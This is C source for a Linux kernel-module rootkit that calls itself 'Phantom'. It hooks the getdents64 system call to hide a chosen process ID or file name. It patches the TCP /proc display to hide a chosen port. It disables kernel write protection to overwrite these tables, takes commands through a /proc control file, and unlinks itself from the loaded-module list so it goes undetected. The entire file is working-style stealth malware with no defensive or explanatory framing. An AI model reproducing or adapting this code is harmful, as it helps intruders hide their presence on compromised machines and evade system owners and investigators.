#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/list.h>
#include <net/tcp.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Phantom rootkit: hide pid / file / port");

typedef unsigned long (*kln_t)(const char *);
static kln_t kln;
static unsigned long *sys_call_table;

static int  hide_pid;
static char hide_name[64];
static int  hide_port;

typedef long (*gdt64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
static gdt64_t orig_getdents64;

static int (*orig_tcp4_seq_show)(struct seq_file *, void *);
static int (*orig_tcp6_seq_show)(struct seq_file *, void *);
static struct seq_operations *tcp4_ops;
static struct seq_operations *tcp6_ops;

static void wp_off(void) { unsigned long c = read_cr0(); write_cr0(c & ~0x10000UL); }
static void wp_on(void)  { unsigned long c = read_cr0(); write_cr0(c |  0x10000UL); }

static long phantom_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp,
                               unsigned int count)
{
    long ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;

    char *kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, dirp, ret)) {
        kfree(kbuf);
        return ret;
    }

    char pidstr[16];
    snprintf(pidstr, sizeof(pidstr), "%d", hide_pid);

    long bpos = 0;
    while (bpos < ret) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + bpos);
        int hide = 0;
        if (hide_pid && strcmp(d->d_name, pidstr) == 0)
            hide = 1;
        else if (hide_name[0] && strcmp(d->d_name, hide_name) == 0)
            hide = 1;
        if (hide) {
            int reclen = d->d_reclen;
            memmove(kbuf + bpos, kbuf + bpos + reclen, ret - bpos - reclen);
            ret -= reclen;
        } else {
            bpos += d->d_reclen;
        }
    }
    copy_to_user(dirp, kbuf, ret);
    kfree(kbuf);
    return ret;
}

static int hexval(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int line_has_port(char *line, int len)
{
    int i;
    for (i = 0; i < len - 4; i++) {
        if (line[i] != ':')
            continue;
        int a = hexval(line[i+1]), b = hexval(line[i+2]);
        int c = hexval(line[i+3]), d = hexval(line[i+4]);
        if (a < 0 || b < 0 || c < 0 || d < 0)
            continue;
        if (((a << 12) | (b << 8) | (c << 4) | d) == hide_port)
            return 1;
    }
    return 0;
}

static int phantom_tcp4_seq_show(struct seq_file *seq, void *v)
{
    int before = seq->count;
    int ret = orig_tcp4_seq_show(seq, v);
    if (ret == 0 && hide_port && seq->count > before) {
        if (line_has_port(seq->buf + before, seq->count - before))
            seq->count = before;
    }
    return ret;
}

static int phantom_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int before = seq->count;
    int ret = orig_tcp6_seq_show(seq, v);
    if (ret == 0 && hide_port && seq->count > before) {
        if (line_has_port(seq->buf + before, seq->count - before))
            seq->count = before;
    }
    return ret;
}

static ssize_t ctl_write(struct file *f, const char __user *buf,
                         size_t len, loff_t *off)
{
    char k[128];
    if (len > sizeof(k) - 1)
        len = sizeof(k) - 1;
    if (copy_from_user(k, buf, len))
        return -EFAULT;
    k[len] = 0;

    char *p = k, *tok = strsep(&p, " \n");
    if (tok && *tok) hide_pid = simple_strtol(tok, NULL, 10);
    tok = strsep(&p, " \n");
    if (tok && *tok) { strncpy(hide_name, tok, sizeof(hide_name)-1); hide_name[sizeof(hide_name)-1]=0; }
    tok = strsep(&p, " \n");
    if (tok && *tok) hide_port = simple_strtol(tok, NULL, 10);

    pr_info("phantom: hide pid=%d name=%s port=%d\n", hide_pid, hide_name, hide_port);
    return len;
}

static const struct proc_ops ctl_ops = { .proc_write = ctl_write };

static int phantom_init(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kp)) return -1;
    kln = (kln_t) kp.addr;
    unregister_kprobe(&kp);

    sys_call_table = (unsigned long *) kln("sys_call_table");
    if (!sys_call_table) return -1;

    orig_getdents64 = (gdt64_t) sys_call_table[__NR_getdents64];
    wp_off();
    sys_call_table[__NR_getdents64] = (unsigned long) phantom_getdents64;
    wp_on();

    tcp4_ops = (struct seq_operations *) kln("tcp4_seq_ops");
    tcp6_ops = (struct seq_operations *) kln("tcp6_seq_ops");
    if (tcp4_ops) { orig_tcp4_seq_show = tcp4_ops->show; wp_off(); tcp4_ops->show = phantom_tcp4_seq_show; wp_on(); }
    if (tcp6_ops) { orig_tcp6_seq_show = tcp6_ops->show; wp_off(); tcp6_ops->show = phantom_tcp6_seq_show; wp_on(); }

    proc_create("phantom_ctl", 0222, NULL, &ctl_ops);
    list_del(&THIS_MODULE->list);
    pr_info("phantom: rootkit loaded\n");
    return 0;
}

static void phantom_exit(void)
{
    if (sys_call_table) { wp_off(); sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64; wp_on(); }
    if (tcp4_ops && orig_tcp4_seq_show) { wp_off(); tcp4_ops->show = orig_tcp4_seq_show; wp_on(); }
    if (tcp6_ops && orig_tcp6_seq_show) { wp_off(); tcp6_ops->show = orig_tcp6_seq_show; wp_on(); }
    remove_proc_entry("phantom_ctl", NULL);
}

module_init(phantom_init);
module_exit(phantom_exit);